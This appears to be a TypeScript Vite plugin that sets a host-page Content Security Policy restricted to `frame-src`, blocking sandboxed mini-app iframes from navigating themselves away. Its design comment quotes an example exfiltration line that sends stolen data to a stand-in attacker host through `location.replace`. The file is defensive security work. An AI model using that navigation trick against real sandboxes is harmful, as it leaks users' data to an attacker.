import type { Plugin } from 'vite';

/**
 * Host-page Content Security Policy — `frame-src` only.
 *
 * WHY THIS EXISTS
 *
 * Untrusted mini-app bundles run in a `sandbox="allow-scripts"` srcdoc
 * iframe (see packages/app/ui/components/SurfaceChannel/). That sandbox
 * plus the child document's own `default-src 'none'` meta CSP stop every
 * *fetch* out of the frame, but neither governs the frame navigating
 * ITSELF. `location.replace('https://attacker/?stolen=…')` is both
 * exfiltration (the URL carries the payload) and execution of unpinned
 * code in the frame that comes back. No `sandbox` token covers
 * self-navigation, `default-src` governs fetches rather than navigation,
 * and CSP3 dropped `navigate-to`.
 *
 * `frame-src` on the HOST page is the directive that closes it, and it is
 * the only directive here. This is the app's first CSP; a broad first
 * policy (`default-src`, `script-src`, …) would break things that were
 * never measured. Keep the scope at `frame-src` until each further
 * directive earns its own experiment.
 *
 * Measured, not assumed: apps/tlon-web/sandbox-posture/navigation.spec.ts
 * runs four self-navigation vectors against seven host configurations on
 * chromium, firefox and webkit. With no host CSP every vector reaches the
 * attacker and commits its response; under `frame-src 'none'`,
 * `'self'`, or an allowlist that excludes the attacker, every vector is
 * BLOCKED-PREFLIGHT — the attacker server records no hit at all. An
 * allowlist-the-attacker control in the same delivery mechanism still
 * navigates, which is what makes the blocking attributable to `frame-src`
 * source matching rather than to the mere presence of a policy.
 *
 * DELIVERY — read this before changing anything below.
 *
 * In production tlon-web is not served by a server we control. `pnpm
 * build` output is packed into a glob (.github/workflows/build-and-glob.yml),
 * published to bootstrap.urbit.org, and referenced from `glob-http+[…]` in
 * desk/desk.docket-0. The ship's `%docket` agent — which lives in the
 * %landscape desk, NOT in this repo — serves it, and its
 * `+payload-from-glob` hardcodes the response headers to `content-type`
 * alone. There is no hook, no configuration, and no repo-local code path
 * that can add a header to that response.
 *
 * That matters because `Content-Security-Policy-Report-Only` is not
 * deliverable in a `<meta>` tag. CSP3 §3.3: "A Document may deliver a
 * policy via one or more HTML meta elements whose http-equiv attributes
 * are an ASCII case-insensitive match for the string
 * 'Content-Security-Policy'", with the note "The
 * Content-Security-Policy-Report-Only header is not supported inside a
 * meta element. Neither are the report-uri, frame-ancestors, and sandbox
 * directives."
 *
 * So: Report-Only cannot reach production, and the enforcing `<meta>` is
 * the only production delivery that exists. What is wired here is
 * therefore split:
 *
 *   - REPORT-ONLY, ENABLED, dev + preview servers only. Every `pnpm dev`
 *     session and the whole Playwright e2e suite (which runs against
 *     `vite`/`vite preview`, see playwright.config.ts) loads the app under
 *     this policy. Violations surface as console
 *     `SecurityPolicyViolationEvent`s and block nothing. This is where the
 *     allowlist gets validated against real usage.
 *   - ENFORCING `<meta>`, WRITTEN BUT OFF. Flipping `ENFORCE_HOST_CSP` to
 *     `true` injects it into index.html at build time, which is the shape
 *     that ships in the glob. That flip is a deliberate posture change and
 *     is out of scope until the Report-Only run above has come back clean.
 */

/**
 * Origins allowed to be framed BY the host page.
 *
 * This list is the whole audit. Every nested browsing context the web
 * build can create was enumerated; exactly one of them navigates to a
 * URL, and it is the single entry below. The rest are recorded here so a
 * future reader does not have to redo the sweep:
 *
 *   - packages/app/ui/components/SurfaceChannel/SurfaceSandboxHost.tsx:103
 *     — the mini-app sandbox. `srcdoc`, `sandbox="allow-scripts"`, with
 *     its own `default-src 'none'` meta CSP. navigation.spec.ts measures
 *     `srcdocLoads: true` under `frame-src 'none'` on chromium, firefox
 *     and webkit, so it needs no entry; `frame-src` never evaluates a
 *     srcdoc document, which is exactly why this policy can be strict.
 *   - The message/gallery/notebook composer, via `@10play/tentap-editor`'s
 *     `RichText` (packages/app/ui/components/MessageInput/index.tsx:199)
 *     onto the `react-native-webview` → `@10play/react-native-web-webview`
 *     alias (apps/tlon-web/reactNativeWebPlugin.ts:82). The call site
 *     passes `customSource: editorHtml`, a prebuilt local HTML string, and
 *     never sets `DEV`, so the shim takes its `html` branch and renders
 *     `srcDoc`. Exempt for the same reason.
 *   - packages/app/features/settings/ManageAccountScreen.tsx:102 — a
 *     `<WebView source={{uri}}>` alongside the iframe below. Dead on web
 *     (`useWebView()` returns null there), and the web shim implements
 *     only `source.html`, so a `{uri}` source renders an iframe with
 *     neither `src` nor `srcdoc`. It stays on its initial about:blank and
 *     never issues a navigation request.
 *
 * Not frames at all, and so not governed here: the `window.open` /
 * `Linking.openURL` call sites (link taps in posts, the Notes publish
 * link, the app-store banner, BOT_SETTINGS_URL, and MCP bot OAuth) all
 * open TOP-LEVEL contexts. `frame-src` does not apply to them, and
 * nothing in this policy should be widened on their account. There are no
 * `<frame>`, `<embed>` or `<object>` elements anywhere in the web build,
 * and no CAPTCHA frame (RECAPTCHA_SITE_KEY is undefined on web).
 */
export const FRAME_SRC_SOURCES = [
  // Same-origin frames. Nothing in the app frames a same-origin URL today,
  // but 'self' costs nothing against the threat being closed — the
  // measured 'B/header/frame-src-self' configuration blocks all four
  // self-navigation vectors pre-flight — and it keeps the policy from
  // being the reason an ordinary same-origin embed breaks later.
  "'self'",

  // Hosting account management, framed on web by
  // packages/app/features/settings/ManageAccountScreen.tsx:94. The URL is
  // the hardcoded constant MANAGE_ACCOUNT_URL
  // ('https://tlon.network/account') at that file's line 14 — one value,
  // no per-environment variation, no env var behind it.
  'https://tlon.network',

  // LATENT, deliberately not enabled: PostHog's Toolbar opens an overlay
  // frame at `ui_host` ('https://eu.posthog.com',
  // packages/app/utils/posthog.web.ts:33). Nothing in this repo calls
  // `posthog.loadToolbar` or handles the `?__posthog=` token flow, so the
  // frame cannot occur today and an entry would widen the policy for a
  // feature that is not wired up. Recorded because it is the one origin
  // that would appear if staff toolbar access were ever turned on.
  // 'https://eu.posthog.com',
] as const;

/** The policy string, identical in both delivery mechanisms. */
export const HOST_CSP_POLICY = `frame-src ${FRAME_SRC_SOURCES.join(' ')}`;

/**
 * THE ONE-LINE FLIP.
 *
 * `false` — dev and preview send `Content-Security-Policy-Report-Only`;
 * nothing is injected into index.html, so the shipped glob carries no CSP
 * and production behaviour is exactly what it is today.
 *
 * `true` — additionally injects the enforcing `<meta http-equiv>` into
 * index.html, which is the only way a policy reaches production through
 * the glob. Do not flip this without a clean Report-Only run first: an
 * origin missing from FRAME_SRC_SOURCES becomes a broken feature, and
 * `report-uri` is not available in a meta tag, so a production
 * enforcement failure is silent.
 */
export const ENFORCE_HOST_CSP = false;

/**
 * Injects the enforcing policy into index.html, and only when
 * ENFORCE_HOST_CSP is on. The Report-Only counterpart is a response
 * header and is configured in vite.config.mts via `hostCspDevHeaders`.
 */
export function hostCspPlugin(): Plugin {
  return {
    name: 'tlon-host-csp',
    transformIndexHtml: {
      order: 'pre',
      handler(html) {
        if (!ENFORCE_HOST_CSP) {
          return html;
        }
        return {
          html,
          tags: [
            {
              tag: 'meta',
              attrs: {
                'http-equiv': 'Content-Security-Policy',
                content: HOST_CSP_POLICY,
              },
              injectTo: 'head-prepend',
            },
          ],
        };
      },
    },
  };
}

/**
 * Report-Only headers for the dev and preview servers. Never enforcing:
 * these servers exist to surface violations, and a blocking policy here
 * would turn an allowlist gap into a failed e2e run rather than a
 * reported one.
 */
export const hostCspDevHeaders: Record<string, string> = {
  'Content-Security-Policy-Report-Only': HOST_CSP_POLICY,
};
